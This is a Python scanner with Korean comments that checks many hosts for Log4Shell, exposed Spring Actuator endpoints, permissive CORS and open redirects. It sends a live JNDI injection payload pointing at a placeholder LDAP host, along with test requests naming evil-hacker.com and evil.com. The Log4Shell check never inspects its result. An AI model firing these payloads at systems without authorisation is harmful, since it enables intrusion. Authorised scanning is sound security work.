import requests
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console

console = Console()

class LightScanner:
    def __init__(self, live_hosts):
        self.live_hosts = [h['url'] for h in live_hosts]
        self.vulns = []

    def scan_cve(self, target_url):
        """특정 도메인에 대해 주요 CVE 및 설정 취약점 검사"""
        try:
            # 1. Log4Shell (CVE-2021-44228) Header Injection Test
            headers = {
                "User-Agent": "${jndi:ldap://log4j.test.example.com/a}",
                "X-Api-Version": "${jndi:ldap://log4j.test.example.com/a}"
            }
            res = requests.get(target_url, headers=headers, timeout=5, verify=False)
            
            # 2. Spring Boot Actuator 노출
            actuator_url = f"{target_url.rstrip('/')}/actuator/env"
            res_actuator = requests.get(actuator_url, timeout=3, verify=False)
            if "activeProfiles" in res_actuator.text or "propertySources" in res_actuator.text:
                self.vulns.append({"type": "Exposed Spring Actuator", "url": actuator_url})

            # 3. CORS Misconfiguration (임의의 Origin 허용)
            cors_headers = {"Origin": "https://evil-hacker.com"}
            res_cors = requests.get(target_url, headers=cors_headers, timeout=3, verify=False)
            if res_cors.headers.get("Access-Control-Allow-Origin") == "https://evil-hacker.com":
                self.vulns.append({"type": "CORS Misconfiguration", "url": target_url})

            # 4. Open Redirect
            redirect_url = f"{target_url.rstrip('/')}//evil.com"
            res_redirect = requests.get(redirect_url, timeout=3, verify=False, allow_redirects=False)
            if res_redirect.status_code in [301, 302] and "evil.com" in res_redirect.headers.get("Location", ""):
                self.vulns.append({"type": "Open Redirect", "url": redirect_url})

        except:
            pass

    def run(self, threads=20):
        console.print(f"[bold blue][*][/bold blue] Running Vulnerability Scanner on {len(self.live_hosts)} hosts...")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.scan_cve, self.live_hosts)
            
        console.print(f"[bold green][+][/bold green] Found {len(self.vulns)} CVEs/Misconfigurations")
        return self.vulns

def run_vuln_scanner(live_hosts):
    scanner = LightScanner(live_hosts)
    return scanner.run()
